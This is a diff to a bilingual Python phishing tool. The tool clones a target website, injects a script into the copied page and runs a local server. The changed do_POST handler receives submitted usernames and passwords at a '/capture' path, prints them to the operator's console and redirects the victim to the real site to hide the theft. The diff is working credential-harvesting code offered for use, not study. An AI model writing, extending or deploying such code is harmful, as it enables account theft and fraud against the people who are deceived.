@@ -285,7 +285,7 @@ def clone_website(url, server_choice, language):
             </script>
             """
 
-           # Inject the script before the closing </body> tag, or inside <head> if <body> is None
+            # Inject the script before the closing </body> tag, or inside <head> if <body> is None
             if soup.body:
                 soup.body.append(BeautifulSoup(script, 'html.parser'))
             elif soup.head:
@@ -298,7 +298,7 @@ def clone_website(url, server_choice, language):
 
             html_content = soup.prettify()
 
-            # Save the HTML and CSS content locally
+            # Save the HTML content locally
             with open('index.html', 'w', encoding='utf-8') as html_file:
                 html_file.write(html_content)
 
@@ -344,27 +344,29 @@ def run_local_server(target_url, language):
                 self.send_error(404, 'File Not Found: %s' % self.path)
 
         def do_POST(self):
-            # Capture the form data from POST request
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode('utf-8')
-            data = json.loads(post_data)
-            username = data.get('username', '')
-            password = data.get('password', '')
+            if self.path == '/capture':
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length).decode('utf-8')
+                data = json.loads(post_data)
 
-            # Print the credentials to the console
-            if language == '1':
-                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
-                print(f"Username: {username}")
-                print(f"Password: {password}")
-            else:
-                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
-                print(f"Nome de Usuário: {username}")
-                print(f"Senha: {password}")
+                # Captura das credenciais
+                username = data.get('username', '')
+                password = data.get('password', '')
 
-            # Redirect to the target URL after capturing the credentials
-            self.send_response(302)
-            self.send_header('Location', target_url)
-            self.end_headers()
+                # Exibir credenciais no console
+                if language == '1':
+                    print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
+                    print(f"Username: {username}")
+                    print(f"Password: {password}")
+                else:
+                    print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
+                    print(f"Nome de Usuário: {username}")
+                    print(f"Senha: {password}")
+
+                # Redirecionar para a URL original após capturar as credenciais
+                self.send_response(302)
+                self.send_header('Location', target_url)
+                self.end_headers()
 
     try:
         # Start the server in a separate thread
@@ -396,7 +398,7 @@ def clean_up_files():
         os.remove('styles.css')
     except Exception as e:
         print(f"Error cleaning up files: {e}")
-
+        
 # Função para informações de número de telefone
 def phone_number_info(language):
     clear_console()
